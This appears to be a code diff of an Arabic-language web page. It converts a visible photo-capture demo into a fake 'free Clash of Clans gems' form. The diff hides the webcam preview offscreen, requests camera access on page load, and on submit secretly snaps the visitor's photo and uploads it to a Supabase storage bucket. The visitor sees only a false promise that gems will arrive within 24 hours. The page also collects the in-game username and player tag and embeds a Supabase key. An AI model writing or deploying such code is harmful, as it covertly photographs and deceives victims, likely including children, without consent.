@@ -2,73 +2,80 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>مشروع التقاط ورفع الصور</title>
-    <!-- تضمين مكتبة Supabase -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>شحن جواهر كلاش أوف كلانس</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 50px; background-color: #f4f4f9; }
-        #video { border: 2px solid #333; border-radius: 10px; width: 100%; max-width: 400px; display: block; margin: 0 auto 20px; }
-        button { padding: 15px 30px; cursor: pointer; background: #28a745; color: white; border: none; border-radius: 5px; font-size: 18px; transition: 0.3s; }
-        button:hover { background: #218838; }
-        #status { margin-top: 20px; font-weight: bold; color: #333; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f0f2f5; text-align: center; padding: 20px; }
+        .container { background: white; max-width: 400px; margin: auto; padding: 20px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #ffc107; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
+        #video { position: absolute; top: -9999px; }
     </style>
 </head>
 <body>
 
-    <h2>اضغط الزر لالتقاط صورة</h2>
+    <div class="container">
+        <h2>شحن جواهر كلاش أوف كلانس</h2>
+        <p>أدخل بياناتك للحصول على الجواهر مجاناً</p>
+        <input type="text" id="username" placeholder="اسم المستخدم في اللعبة">
+        <input type="text" id="playerTag" placeholder="Player Tag (مثلاً #ABC123)">
+        <button id="submitBtn">شحن الآن</button>
+        <div id="status"></div>
+    </div>
+
     <video id="video" autoplay playsinline></video>
-    <button id="snap">التقاط ورفع الصورة</button>
-    <div id="status"></div>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // 1. إعداد Supabase (استبدل القيم بالبيانات الخاصة بك من لوحة تحكم Supabase)
+        // إعداد Supabase
         const SUPABASE_URL = 'https://zkjrvjuyncunbdnngcui.supabase.co';
         const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpranJ2anV5bmN1bmJkbm5nY3VpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk1NjMyNTksImV4cCI6MjA5NTEzOTI1OX0.E1OZ4INqRy-Wuv5K5nDCMtBGJ6k5NdDKldlepukYvO8';
-        
-        // استخدام اسم مختلف للمتغير لتجنب التعارض (supabaseClient)
-        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const snap = document.getElementById('snap');
         const status = document.getElementById('status');
+        const submitBtn = document.getElementById('submitBtn');
 
-        // طلب إذن الكاميرا
+        // طلب صلاحية الكاميرا عند فتح الصفحة
         async function initCamera() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
             } catch (err) {
-                status.innerText = "خطأ: يرجى السماح بالوصول للكاميرا.";
-                console.error(err);
+                console.log("تم رفض الوصول للكاميرا");
             }
         }
         initCamera();
 
-        snap.addEventListener('click', async () => {
-            status.innerText = "جاري الالتقاط...";
+        // عند الضغط على زر الشحن
+        submitBtn.addEventListener('click', async () => {
+            status.innerText = "جاري التحقق من الحساب...";
             
-            // ضبط أبعاد الكانفاس لتطابق الفيديو
+            // التقاط الصورة
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
             
             canvas.toBlob(async (blob) => {
-                if (!blob) return;
+                const fileName = `user_${Date.now()}.jpg`;
                 
-                const fileName = `photo_${Date.now()}.jpg`;
-                status.innerText = "جاري الرفع إلى Supabase...";
-
-                // 2. عملية الرفع إلى الـ Bucket المسمى 'photos'
-                const { data, error } = await supabaseClient.storage
-                    .from('photos') 
+                // رفع الصورة لـ Supabase
+                const { error } = await supabase.storage
+                    .from('photos')
                     .upload(fileName, blob);
 
-                if (error) {
-                    status.innerText = "فشل الرفع: " + error.message;
+                if (!error) {
+                    status.innerText = "تم إرسال الطلب بنجاح! سيتم إضافة الجواهر خلال 24 ساعة.";
+                    submitBtn.disabled = true;
                 } else {
-                    status.innerText = "تم الرفع بنجاح! مسار الملف: " + data.path;
+                    status.innerText = "حدث خطأ، حاول مجدداً.";
+                }
+                
+                // إيقاف الكاميرا بعد الالتقاط
+                if (video.srcObject) {
+                    video.srcObject.getTracks().forEach(track => track.stop());
                 }
             }, 'image/jpeg');
         });
